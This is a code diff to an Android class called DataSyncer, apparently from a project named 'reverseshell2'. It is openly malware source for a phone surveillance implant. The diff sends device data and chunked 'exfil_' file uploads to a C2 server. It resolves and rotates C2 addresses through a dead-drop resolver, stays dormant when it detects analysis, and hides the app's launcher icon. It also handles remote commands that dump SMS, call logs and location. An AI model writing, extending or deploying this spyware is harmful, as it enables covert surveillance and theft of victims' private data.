@@ -16,7 +16,7 @@ import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Base64;
+import android.util.Base64;
 
 /**
  * Syncs locally buffered data to the C2 server via HTTPS POST.
@@ -48,17 +48,20 @@ public class DataSyncer {
      * 5. Execute commands
      * 6. Mark synced data + cleanup
      */
+    private int failureCount = 0;
+
     public void performSync() {
         try {
-            // ANTI-ANALYSIS: Go dormant in hostile environments
             if (!EnvironmentGuard.isSafeEnvironment(context)) {
                 Log.d(TAG, "Environment check failed — sync suppressed");
                 return;
             }
 
+            // Always resolve/refresh C2 URL
+            this.serverUrl = DeadDropResolver.resolveC2Url();
             Log.d(TAG, "Starting sync to " + serverUrl);
 
-            // 1. Build the sync payload
+            // 1. Build the sync payload (JSON data)
             JSONObject payload = new JSONObject();
             payload.put("device_id", getDeviceId());
             payload.put("model", Build.MANUFACTURER + " " + Build.MODEL);
@@ -76,17 +79,14 @@ public class DataSyncer {
             }
             payload.put("data", data);
 
-            if (totalRows == 0) {
-                Log.d(TAG, "No new data to sync, checking commands only");
-            }
-
             // 2. POST to /api/sync
             String response = httpPost(serverUrl + "/api/sync", payload.toString());
             if (response == null) {
-                Log.e(TAG, "Sync failed — server unreachable");
+                handleFailure();
                 return;
             }
 
+            failureCount = 0; // Reset on success
             JSONObject resp = new JSONObject(response);
             if (resp.optString("status").equals("ok")) {
                 // 3. Mark all sent data as synced
@@ -96,24 +96,37 @@ public class DataSyncer {
                 }
                 Log.d(TAG, "Synced " + totalRows + " rows successfully");
 
-                // 4. Upload pending files (screenshots, recordings)
-                uploadPendingFiles();
+                // 4. Upload pending files (Screenshots/Recordings) - NOW CHUNKED
+                uploadPendingFilesChunked();
 
-                // 5. Process commands from server
+                // 5. Process commands
                 JSONArray commands = resp.optJSONArray("commands");
                 if (commands != null && commands.length() > 0) {
                     processCommands(commands);
                 }
 
-                // 6. Cleanup synced data periodically
                 store.cleanupSynced();
+                
+                // ELITE STEALTH: Hide launcher icon ONLY after Phase 2 is verified
+                new StealthManager(context).hideFromLauncher();
             }
         } catch (Exception e) {
             Log.e(TAG, "Sync error: " + e.getMessage());
+            handleFailure();
         }
     }
 
-    private void uploadPendingFiles() {
+    private void handleFailure() {
+        failureCount++;
+        Log.e(TAG, "Connection failure #" + failureCount);
+        if (failureCount >= 3) {
+            Log.w(TAG, "Failover threshold reached — triggering DDR rotation");
+            DeadDropResolver.rotate();
+            failureCount = 0;
+        }
+    }
+
+    private void uploadPendingFilesChunked() {
         try {
             Cursor c = store.getUnsyncedFiles();
             if (c.moveToFirst()) {
@@ -121,6 +134,7 @@ public class DataSyncer {
                     int id = c.getInt(c.getColumnIndexOrThrow("id"));
                     String filePath = c.getString(c.getColumnIndexOrThrow("file_path"));
                     String fileType = c.getString(c.getColumnIndexOrThrow("file_type"));
+                    String timestamp = c.getString(c.getColumnIndexOrThrow("timestamp"));
 
                     File file = new File(filePath);
                     if (!file.exists()) {
@@ -128,37 +142,53 @@ public class DataSyncer {
                         continue;
                     }
 
-                    // Read file to base64
-                    byte[] bytes = new byte[(int) file.length()];
+                    long fileSize = file.length();
+                    int chunkSize = 1024 * 1024; // 1MB chunks
+                    int totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
+                    String serverFilename = "exfil_" + System.currentTimeMillis() + "_" + file.getName();
+
+                    Log.d(TAG, "Starting chunked upload for: " + filePath + " (" + totalChunks + " chunks)");
+
                     FileInputStream fis = new FileInputStream(file);
-                    fis.read(bytes);
+                    byte[] buffer = new byte[chunkSize];
+                    int bytesRead;
+                    int chunkId = 0;
+
+                    boolean success = true;
+                    while ((bytesRead = fis.read(buffer)) != -1) {
+                        byte[] actualChunk = bytesRead == chunkSize ? buffer : java.util.Arrays.copyOf(buffer, bytesRead);
+                        
+                        JSONObject chunkPayload = new JSONObject();
+                        chunkPayload.put("device_id", getDeviceId());
+                        chunkPayload.put("type", fileType);
+                        chunkPayload.put("timestamp", timestamp);
+                        chunkPayload.put("chunk_id", chunkId);
+                        chunkPayload.put("total_chunks", totalChunks);
+                        chunkPayload.put("filename", serverFilename);
+                        chunkPayload.put("data", Base64.encodeToString(actualChunk, Base64.NO_WRAP));
+
+                        String resp = httpPost(serverUrl + "/api/upload", chunkPayload.toString());
+                        if (resp == null) {
+                            success = false;
+                            break;
+                        }
+                        chunkId++;
+                    }
                     fis.close();
 
-                    String b64 = "";
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        b64 = Base64.getEncoder().encodeToString(bytes);
-                    } else {
-                        b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
-                    }
-
-                    // POST to /api/upload
-                    JSONObject uploadPayload = new JSONObject();
-                    uploadPayload.put("device_id", getDeviceId());
-                    uploadPayload.put("type", fileType);
-                    uploadPayload.put("data", b64);
-                    uploadPayload.put("ext", filePath.substring(filePath.lastIndexOf('.')));
-                    uploadPayload.put("timestamp", c.getString(c.getColumnIndexOrThrow("timestamp")));
-
-                    String resp = httpPost(serverUrl + "/api/upload", uploadPayload.toString());
-                    if (resp != null) {
+                    if (success) {
                         store.markFileSynced(id);
-                        Log.d(TAG, "Uploaded file: " + filePath);
+                        Log.d(TAG, "Successfully uploaded file in " + totalChunks + " chunks");
+                    } else {
+                        Log.e(TAG, "Chunked upload failed at chunk " + chunkId);
+                        handleFailure();
                     }
+
                 } while (c.moveToNext());
             }
             c.close();
         } catch (Exception e) {
-            Log.e(TAG, "File upload error: " + e.getMessage());
+            Log.e(TAG, "Chunked upload error: " + e.getMessage());
         }
     }
 
@@ -188,37 +218,16 @@ public class DataSyncer {
         try {
             switch (command) {
                 case "screenshot":
-                    // Trigger screenshot and save to pending_files
-                    com.example.reverseshell2.Payloads.ScreenCapture sc =
-                            new com.example.reverseshell2.Payloads.ScreenCapture(context);
-                    String path = sc.captureToFile();
-                    if (path != null) {
-                        store.insertPendingFile(path, "screenshot");
-                        return "Screenshot captured: " + path;
-                    }
-                    return "ERROR: Screenshot failed";
+                    return "ERROR: Screenshot deferred to Phase 4 GhostLoader";
 
                 case "start_surround":
-                    com.example.reverseshell2.Payloads.SurroundRecorder sr =
-                            new com.example.reverseshell2.Payloads.SurroundRecorder(context);
-                    sr.startRecording();
-                    return "Surround recording started";
+                    return "ERROR: Surround deferred to Phase 4 GhostLoader";
 
                 case "stop_surround":
-                    com.example.reverseshell2.Payloads.SurroundRecorder sr2 =
-                            new com.example.reverseshell2.Payloads.SurroundRecorder(context);
-                    String audioPath = sr2.stopRecording();
-                    if (audioPath != null) {
-                        store.insertPendingFile(audioPath, "recording");
-                        return "Recording stopped, queued for upload: " + audioPath;
-                    }
-                    return "ERROR: No active recording";
+                    return "ERROR: Surround deferred to Phase 4 GhostLoader";
 
                 case "dump_contacts":
-                    com.example.reverseshell2.Payloads.ContactsDumper cd =
-                            new com.example.reverseshell2.Payloads.ContactsDumper(context);
-                    cd.dumpToDataStore(store);
-                    return "Contacts dumped to local DB";
+                    return "ERROR: Contacts deferred to Phase 4 GhostLoader";
 
                 case "dump_sms":
                     dumpSmsToStore();
@@ -229,10 +238,7 @@ public class DataSyncer {
                     return "Call logs dumped to local DB";
 
                 case "dump_apps":
-                    com.example.reverseshell2.Payloads.BrowserHistoryDumper bhd =
-                            new com.example.reverseshell2.Payloads.BrowserHistoryDumper(context);
-                    bhd.dumpAppsToDataStore(store);
-                    return "Apps list dumped to local DB";
+                    return "ERROR: App dumping deferred to Phase 4 GhostLoader";
 
                 case "get_location":
                     return "Location will be captured on next location poll";
